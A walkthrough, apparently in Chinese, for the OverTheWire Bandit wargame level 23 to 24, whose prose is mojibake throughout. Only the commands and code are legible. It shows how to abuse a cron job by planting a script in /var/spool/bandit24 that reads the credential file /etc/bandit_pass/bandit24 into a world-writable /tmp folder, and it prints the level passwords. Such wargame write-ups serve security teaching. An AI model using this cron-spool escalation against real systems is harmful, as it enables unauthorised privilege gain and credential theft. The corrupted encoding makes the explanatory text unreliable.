# Bandit Level 23 â†’ Level 24 æ”»ç•¥ ğŸ“œ

## å…³å¡ç›®æ ‡ ğŸ¯

æœ¬å…³å¡çš„ç›®æ ‡æ˜¯åˆ†æä¸€ä¸ªä»¥bandit24ç”¨æˆ·èº«ä»½è¿è¡Œçš„cronä»»åŠ¡ï¼Œç¼–å†™ä¸€ä¸ªè„šæœ¬æ¥è·å–ä¸‹ä¸€å…³çš„å¯†ç ï¼Œå¹¶å°†è¯¥è„šæœ¬æ”¾åœ¨`/var/spool/bandit24/`ç›®å½•ä¸­æ‰§è¡Œã€‚

## æ‰€éœ€çŸ¥è¯† ğŸ“š

### Cronå®šæ—¶ä»»åŠ¡ â±ï¸

ä¸å‰ä¸¤å…³ç±»ä¼¼ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£cronå®šæ—¶ä»»åŠ¡çš„åŸºæœ¬æ¦‚å¿µå’Œé…ç½®ã€‚

### Shellè„šæœ¬ç¼–å†™ ğŸ“

æˆ‘ä»¬éœ€è¦ç¼–å†™ä¸€ä¸ªshellè„šæœ¬æ¥è·å–å¯†ç ã€‚

### æ–‡ä»¶æƒé™å’Œç›®å½•æƒé™ ğŸ”’

æˆ‘ä»¬éœ€è¦ç¡®ä¿æˆ‘ä»¬åˆ›å»ºçš„è„šæœ¬å…·æœ‰æ­£ç¡®çš„æƒé™ï¼Œä»¥ä¾¿bandit24ç”¨æˆ·å¯ä»¥æ‰§è¡Œå®ƒã€‚

### ä¸´æ—¶ç›®å½•å’Œæ–‡ä»¶ ğŸ“‚

æˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸´æ—¶ç›®å½•æ¥å­˜å‚¨æˆ‘ä»¬çš„è„šæœ¬å’Œè¾“å‡ºæ–‡ä»¶ã€‚

## è¯¦ç»†è§£é¢˜æ­¥éª¤ ğŸ“

### 1. ç™»å½•æ¸¸æˆæœåŠ¡å™¨ ğŸ”

ä½¿ç”¨ä¸Šä¸€å…³è·å¾—çš„å¯†ç ç™»å½•æœåŠ¡å™¨ï¼š

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

å¯†ç ï¼š`jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`

### 2. æŸ¥çœ‹cronä»»åŠ¡ ğŸ‘€

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æŸ¥çœ‹ä¸bandit24ç›¸å…³çš„cronä»»åŠ¡ï¼š

```bash
cat /etc/cron.d/cronjob_bandit24
```

è¾“å‡ºç»“æœåº”è¯¥ç±»ä¼¼äºï¼š

```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

è¿™è¡¨æ˜ç³»ç»Ÿä¼šåœ¨æ¯æ¬¡é‡å¯æ—¶ä»¥åŠæ¯åˆ†é’Ÿä»¥bandit24ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œ`/usr/bin/cronjob_bandit24.sh`è„šæœ¬ã€‚

### 3. æŸ¥çœ‹cronè„šæœ¬ ğŸ“œ

ç°åœ¨æˆ‘ä»¬éœ€è¦æŸ¥çœ‹`/usr/bin/cronjob_bandit24.sh`è„šæœ¬çš„å†…å®¹ï¼š

```bash
cat /usr/bin/cronjob_bandit24.sh
```

è¾“å‡ºç»“æœåº”è¯¥ç±»ä¼¼äºï¼š

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

è¿™ä¸ªè„šæœ¬åšäº†ä»¥ä¸‹å‡ ä»¶äº‹ï¼š
1. ä½¿ç”¨`whoami`å‘½ä»¤è·å–å½“å‰ç”¨æˆ·åï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨`myname`å˜é‡ä¸­
2. åˆ‡æ¢åˆ°`/var/spool/$myname`ç›®å½•ï¼ˆå³`/var/spool/bandit24`ï¼‰
3. éå†è¯¥ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶
4. å¯¹äºæ¯ä¸ªæ–‡ä»¶ï¼Œæ£€æŸ¥å…¶æ‰€æœ‰è€…æ˜¯å¦ä¸ºbandit23
5. å¦‚æœæ‰€æœ‰è€…æ˜¯bandit23ï¼Œåˆ™æ‰§è¡Œè¯¥æ–‡ä»¶ï¼ˆæœ€å¤šè¿è¡Œ60ç§’ï¼‰
6. æ‰§è¡Œååˆ é™¤è¯¥æ–‡ä»¶

è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åœ¨`/var/spool/bandit24`ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†ä»¥bandit24ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œï¼Œç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥è„šæœ¬è¯»å–bandit24çš„å¯†ç ã€‚

### 4. åˆ›å»ºä¸´æ—¶ç›®å½• ğŸ“‚

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªä¸´æ—¶ç›®å½•æ¥å­˜å‚¨æˆ‘ä»¬çš„è„šæœ¬å’Œè¾“å‡ºæ–‡ä»¶ï¼š

```bash
mkdir -p /tmp/bandit23_to_24
chmod 777 /tmp/bandit23_to_24
```

### 5. ç¼–å†™è„šæœ¬ ğŸ“

ç°åœ¨æˆ‘ä»¬éœ€è¦ç¼–å†™ä¸€ä¸ªè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†è¯»å–bandit24çš„å¯†ç å¹¶å°†å…¶å†™å…¥æˆ‘ä»¬çš„ä¸´æ—¶ç›®å½•ï¼š

```bash
nano /tmp/bandit23_to_24/get_password.sh
```

åœ¨ç¼–è¾‘å™¨ä¸­è¾“å…¥ä»¥ä¸‹å†…å®¹ï¼š

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/bandit23_to_24/password.txt
chmod 666 /tmp/bandit23_to_24/password.txt
```

ä¿å­˜å¹¶é€€å‡ºç¼–è¾‘å™¨ï¼ˆåœ¨nanoä¸­ï¼ŒæŒ‰Ctrl+Oä¿å­˜ï¼Œç„¶åæŒ‰Ctrl+Xé€€å‡ºï¼‰ã€‚

### 6. è®¾ç½®è„šæœ¬æƒé™ ğŸ”’

æˆ‘ä»¬éœ€è¦ç¡®ä¿è„šæœ¬å…·æœ‰æ‰§è¡Œæƒé™ï¼Œå¹¶ä¸”æ‰€æœ‰è€…æ˜¯bandit23ï¼š

```bash
chmod 777 /tmp/bandit23_to_24/get_password.sh
```

### 7. å¤åˆ¶è„šæœ¬åˆ°cronç›®å½• ğŸ“‹

ç°åœ¨æˆ‘ä»¬éœ€è¦å°†è„šæœ¬å¤åˆ¶åˆ°`/var/spool/bandit24`ç›®å½•ï¼Œä»¥ä¾¿å®ƒè¢«cronä»»åŠ¡æ‰§è¡Œï¼š

```bash
cp /tmp/bandit23_to_24/get_password.sh /var/spool/bandit24/
```

### 8. ç­‰å¾…è„šæœ¬æ‰§è¡Œ â±ï¸

cronä»»åŠ¡æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼ˆæœ€å¤šä¸€åˆ†é’Ÿï¼‰è®©è„šæœ¬æ‰§è¡Œï¼š

```bash
sleep 60
```

### 9. æŸ¥çœ‹å¯†ç æ–‡ä»¶ ğŸ”‘

ç°åœ¨æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹è„šæœ¬ç”Ÿæˆçš„å¯†ç æ–‡ä»¶ï¼š

```bash
cat /tmp/bandit23_to_24/password.txt
```

è¾“å‡ºç»“æœåº”è¯¥æ˜¾ç¤ºbandit24çš„å¯†ç ï¼š

```
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

## å‘½ä»¤è§£é‡Š ğŸ”

- `mkdir -p /tmp/bandit23_to_24`ï¼š
  - `mkdir`ï¼šåˆ›å»ºç›®å½•
  - `-p`ï¼šå¦‚æœéœ€è¦ï¼Œåˆ›å»ºçˆ¶ç›®å½•
  - `/tmp/bandit23_to_24`ï¼šè¦åˆ›å»ºçš„ç›®å½•
- `chmod 777 /tmp/bandit23_to_24`ï¼š
  - `chmod`ï¼šæ›´æ”¹æ–‡ä»¶æƒé™
  - `777`ï¼šè®¾ç½®æƒé™ä¸ºæ‰€æœ‰ç”¨æˆ·å¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œ
  - `/tmp/bandit23_to_24`ï¼šç›®æ ‡ç›®å½•
- `nano /tmp/bandit23_to_24/get_password.sh`ï¼š
  - `nano`ï¼šæ–‡æœ¬ç¼–è¾‘å™¨
  - `/tmp/bandit23_to_24/get_password.sh`ï¼šè¦ç¼–è¾‘çš„æ–‡ä»¶
- `cp /tmp/bandit23_to_24/get_password.sh /var/spool/bandit24/`ï¼š
  - `cp`ï¼šå¤åˆ¶æ–‡ä»¶
  - `/tmp/bandit23_to_24/get_password.sh`ï¼šæºæ–‡ä»¶
  - `/var/spool/bandit24/`ï¼šç›®æ ‡ç›®å½•

## å­¦ä¹ è¦ç‚¹æ€»ç»“ ğŸ“Œ

1. **Shellè„šæœ¬ç¼–å†™** - å­¦ä¹ äº†å¦‚ä½•ç¼–å†™ç®€å•çš„shellè„šæœ¬
2. **æ–‡ä»¶æƒé™è®¾ç½®** - äº†è§£äº†å¦‚ä½•è®¾ç½®æ–‡ä»¶å’Œç›®å½•çš„æƒé™
3. **Cronä»»åŠ¡åˆ©ç”¨** - å­¦ä¹ äº†å¦‚ä½•åˆ©ç”¨cronä»»åŠ¡æ‰§è¡Œç‰¹æƒæ“ä½œ
4. **ä¸´æ—¶æ–‡ä»¶å’Œç›®å½•** - äº†è§£äº†å¦‚ä½•ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶å’Œç›®å½•è¿›è¡Œæ•°æ®ä¼ é€’

## æç¤º ğŸ’¡

- åœ¨ç¼–å†™è„šæœ¬æ—¶ï¼Œç¡®ä¿è„šæœ¬å…·æœ‰æ­£ç¡®çš„æƒé™ï¼Œä»¥ä¾¿ç›®æ ‡ç”¨æˆ·å¯ä»¥æ‰§è¡Œå®ƒ
- ä½¿ç”¨ä¸´æ—¶ç›®å½•æ—¶ï¼Œç¡®ä¿è®¾ç½®é€‚å½“çš„æƒé™ï¼Œä»¥ä¾¿å¯ä»¥è¯»å–å’Œå†™å…¥æ–‡ä»¶
- åœ¨å®é™…ç³»ç»Ÿä¸­ï¼Œåº”è¯¥é¿å…è®¾ç½®è¿‡äºå®½æ¾çš„æƒé™ï¼ˆå¦‚777ï¼‰ï¼Œè¿™å¯èƒ½å¯¼è‡´å®‰å…¨é£é™©
- cronä»»åŠ¡æ˜¯è‡ªåŠ¨åŒ–ç³»ç»Ÿç®¡ç†çš„å¼ºå¤§å·¥å…·ï¼Œä½†ä¹Ÿå¯èƒ½è¢«æ»¥ç”¨ï¼Œå› æ­¤åº”è¯¥è°¨æ…é…ç½®

## ä¸‹ä¸€æ­¥ â­ï¸

ä½¿ç”¨è·å¾—çš„å¯†ç ç™»å½•åˆ°Level 24ï¼š

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

å¯†ç ï¼š`UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`

## ç›¸å…³èµ„æº ğŸ”—

- [Bashè„šæœ¬ç¼–ç¨‹æŒ‡å—](https://www.gnu.org/software/bash/manual/bash.html)
- [Linuxæ–‡ä»¶æƒé™è¯¦è§£](https://www.linux.com/training-tutorials/understanding-linux-file-permissions/)
- [Cronå®šæ—¶ä»»åŠ¡å®‰å…¨æœ€ä½³å®è·µ](https://www.digitalocean.com/community/tutorials/how-to-use-cron-to-automate-tasks-on-a-vps)
